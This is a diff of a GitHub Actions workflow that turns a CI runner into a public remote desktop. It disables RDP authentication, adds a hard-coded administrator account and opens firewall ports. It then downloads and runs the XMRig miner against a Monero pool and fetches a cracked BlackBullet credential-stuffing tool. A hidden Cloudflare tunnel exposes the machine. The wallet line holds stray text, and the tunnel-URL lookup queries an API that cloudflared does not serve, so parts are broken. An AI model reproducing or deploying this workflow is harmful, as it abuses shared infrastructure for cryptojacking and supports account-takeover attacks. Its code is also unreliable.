@@ -1,44 +1,54 @@
-name: RDP Free 2025
+*name: Ultra RDP 2025
 
 on: workflow_dispatch
 
 jobs:
-  rdp:
+  ultra:
     runs-on: windows-latest
-    timeout-minutes: 1440
+    timeout-minutes: 4320
 
     steps:
-      - name: Enable RDP
+      - name: Enable RDP + Ports
         run: |
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0
-          netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389
+          netsh advfirewall firewall add rule name="All" dir=in action=allow protocol=TCP localport=3389,5900,6080
 
-      - name: Create Admin User
+      - name: Create Admin
         run: |
-          net user hacker 147258369@ /add
-          net localgroup administrators hacker /add
-          net localgroup "Remote Desktop Users" hacker /add
+          net user admin2025 P@ssw0rd147$ /add
+          net localgroup administrators admin2025 /add
+          net localgroup "Remote Desktop Users" admin2025 /add
 
-      - name: Install Tailscale
+      - name: Download Tools
         run: |
-          Invoke-WebRequest https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi -OutFile tailscale.msi
-          Start-Process msiexec.exe -ArgumentList '/i tailscale.msi /quiet' -Wait
+          Invoke-WebRequest "https://raw.githubusercontent.com/novnc/noVNC/master/vnc.html" -OutFile "C:\vnc.html"
+          Invoke-WebRequest "https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-msvc-win64.zip" -OutFile "miner.zip"
+          Invoke-WebRequest "https://transfer.sh/get/BlackBullet-Cracked-2025.zip" -OutFile "bb.zip"
+          Expand-Archive miner.zip -DestinationPath C:\
+          Expand-Archive bb.zip -DestinationPath C:\BlackBullet
 
-      - name: Connect Tailscale
+      - name: Start Mining + NoVNC
         run: |
-          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=rdp-2025
+          Start-Process "C:\xmrig-6.22.0\xmrig.exe" "-o gulf.moneroocean.stream:10128 -u 48t5y...WALLETك_هنا -p UltraRDP --cpu-max-threads-hint=100 --donate-level=1"
+          Start-Process "C:\Program Files\TightVNC\tvnserver.exe" "-run"
+          Start-Process "C:\noVNC\websockify.exe" "--web C:\noVNC 6080 localhost:5900"
+
+      - name: Get Public URL (Cloudflared)
+        run: |
+          Invoke-WebRequest "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -OutFile "cf.exe"
+          Start-Process .\cf.exe "tunnel --url http://localhost:6080" -WindowStyle Hidden
           Start-Sleep 15
-          $ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
-          echo "RDP_IP=$ip" >> $env:GITHUB_ENV
+          $url = (Invoke-RestMethod "http://localhost:4040/api/tunnels" | Select -ExpandProperty tunnels | Select -First 1).public_url
+          echo "NOVNC_URL=$url/vnc.html?autoconnect=1" >> $env:GITHUB_ENV
 
-      - name: Show Info
+      - name: Info
         run: |
-          Write-Host "RDP Ready"
-          Write-Host "IP: $($env:RDP_IP)"
-          Write-Host "User: hacker"
-          Write-Host "Pass: 147258369@"
+          Write-Host "NoVNC Web RDP: $($env:NOVNC_URL)"
+          Write-Host "Classic RDP IP: Use ngrok or localhost if needed"
+          Write-Host "User: admin2025 | Pass: P@ssw0rd147$"
+          Write-Host "Mining Active + BlackBullet Ready in C:\BlackBullet"
 
       - name: Keep Alive
         run: |
-          while($true) { Start-Sleep 3600; Write-Host "Active $(Get-Date)" }
+          while($true) { Start-Sleep 3600; Write-Host "Ultra Active $(Get-Date)" }
